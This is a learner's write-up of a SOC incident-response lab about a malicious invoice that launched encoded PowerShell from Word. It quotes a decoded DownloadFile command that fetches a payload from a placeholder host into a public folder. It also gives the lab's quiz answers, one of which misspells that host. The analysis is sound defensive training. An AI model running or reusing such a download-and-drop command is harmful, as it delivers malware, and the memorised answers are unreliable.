This is a lab from codelivly.

# Incident brief - Northwind Logistics

**Date:** Tuesday 19 January 2027  
**Raised by:** Service Desk, ticket NWL-SD-88214  
**Severity on intake:** medium (pending triage)

## Background

Northwind Logistics is a freight forwarder with about 300 staff across two sites. Workstations are
Windows 11, managed by Configuration Manager, with Sysmon and PowerShell script-block
logging forwarded to Wazuh. Accounts Payable handles supplier invoices by email and opens
attachments routinely - it is the job.

## What was reported

At 10:05 a member of Accounts Payable phoned the service desk. An invoice attachment had
opened 'oddly' - the document appeared blank, and a window flashed on screen and closed.
They were unsure which supplier it came from and carried on working.

## What the SOC has so far

The Wazuh feed for the day is dominated by rule 92052 (PowerShell executed with an encoded
command), which fires constantly in this estate because the deployment tooling uses
`-EncodedCommand` for everything. Nobody has been able to use that rule to find anything.

One rule 92100 fired once. Nobody has triaged it yet.

## Business impact

The affected workstation has access to the supplier payment portal and a mapped drive on
SRV-FILE-01 containing payment run files. Nothing is confirmed accessed. Finance close is
in nine days.

## Evidence

| File | Contents |
|---|---|
| `sysmon.log` | Sysmon events, JSON Lines - process creation (EID 1) and file create (EID 11) |
| `powershell-operational.log` | PowerShell EID 4104 script blocks, JSON Lines |
| `wazuh-alerts.json` | the day's Wazuh alerts, JSON Lines |
| `asset-inventory.csv` | host ownership, roles and approved ranges |
| `powershell-reference.md` | how to read these logs, and how to decode an encoded command |

## Investigation Actions

I started by sorting/count witch parents processes was in the syslog.log.

<img width="738" height="195" alt="image" src="https://github.com/user-attachments/assets/0727c67f-b6e5-4858-844c-caf8430a1be6" />

**What stands out:**

**WINWORD.EXE has 24 children**. Word spawns very little in normal use, so this fits the "invoice opened oddly, blank document, flashing window" report. 
**powershell.exe** as a parent (1 event) and **MsiExec.exe** (1 event). The one-off PowerShell parent is probably a second-stage child process, so find out what it launched. 
The single MsiExec is worth a look too, but it's likely a distractor.
Everything else (explorer, services, gpscript, CcmExec, SenseIR) matches the deployment, GPO and agent noise the brief describes.

Break down what Word spawned:
<img width="1267" height="463" alt="image" src="https://github.com/user-attachments/assets/11ce6c46-04e5-4c72-afb8-064608345e4b" />

> Word had 24 children. 23 were splwow64.exe, the normal print helper. The one exception was the hidden, bypass-policy, encoded powershell.exe on WKS-4412 at 09:41:26. Word has no reason to start an interpreter, and it matches the "blank invoice, flashing window" report.

Break down powershell event:
<img width="1257" height="62" alt="image" src="https://github.com/user-attachments/assets/9e89018d-0353-4522-968d-579ce9066985" />

Decoding word base64:
<img width="1263" height="135" alt="image" src="https://github.com/user-attachments/assets/2793735a-efe9-4d98-adb6-ef0f77957306" />

Looking at EID 11 file creates in the same window for dropped files (temp, AppData, Startup, the invoice itself):
<img width="1265" height="51" alt="image" src="https://github.com/user-attachments/assets/14af6c2d-d190-4045-88f9-94d99fae886c" />

Checked the wazuh rule 92100 alert:
<img width="1254" height="61" alt="image" src="https://github.com/user-attachments/assets/9be06955-61c3-4c56-97d3-58bd608dc1cc" />


That's how o initialy started analysing and collecting context for investigation, let's take a look into the questions and break them. Most of then already could be answered.
Q1. Which host did the malicious PowerShell run on? `WKS-4412`
Q2. Which user account was it running as? (username only, without the NWL\ domain prefix), answer, `r.castellanos`
Q3. Which parent process spawned it? (image name, or the full path), the process that started the event `WINWORD.EXE`
Q4. When was that PowerShell process created? (YYYY-MM-DD HH:MM:SS, UTC)
   For that i needed more info, because i only had colected the other timestamps in the chain, `09:41:29 is the file create of svchost-update.dat (EID 11) and the Wazuh 92100 alert`or `09:41:31 is the rundll32.exe launch, a child of PowerShell.`
<img width="1260" height="152" alt="image" src="https://github.com/user-attachments/assets/42709e25-0106-4324-a0da-e986f94d0470" />
answer: `2027-01-19 09:41:26`

Q5.  How many process creations in sysmon.log ran with -EncodedCommand?
   For that i needed more info, just ran a Wc for -EncodedCommand, got answer, `48`.
<img width="935" height="36" alt="image" src="https://github.com/user-attachments/assets/37ab0f81-52d2-489e-89ca-3d995f1cafc5" />
Q6. Which external host does the decoded command download from?
It comes from the decoded command: "DownloadFile('http://cdn-updates.contoso-delivery.invalid/upd/pkg.bin', ...)." soo the answer it's `dn-updates.contoso-delivery.invalid`.

Q7: File written to disk.
This is the second argument to DownloadFile. It also matches the Sysmon EID 11 TargetFilename at 09:41:29 and the Wazuh 92100 alert. It is a world-writable folder with a name that mimics a system file, so it looks like masquerading.
Answer: `C:\Users\Public\svchost-update.dat`

Q8. What SHA-256 does Sysmon record for that dropped file?
`9f2b8c41d7e63a05b8f14c92e7d3a6b0c5f8e2149a7d63b0f4e8c1a5d92b7e360`

Q9: Execution technique
`T1059.001`, Command and Scripting Interpreter: PowerShell. The parent technique T1059 parent its the answer.
https://attack.mitre.org/techniques/T1059/001/


Q10: Encoding technique
`T1027`, Obfuscated Files or Information. This is the Defense Evasion technique for hiding the payload's readability.
https://attack.mitre.org/techniques/T1027/


## IR 
#Containment: 
Isolate WKS-4412, revoke r.castellanos's payment-portal session, block the external host at the proxy, hunt the dropped hash estate-wide, and check whether the same attachment reached other Accounts Payable mailboxes.

#Preserve evidence:
Capture a memory image, then a disk image or EDR triage package, before any cleanup.



   

















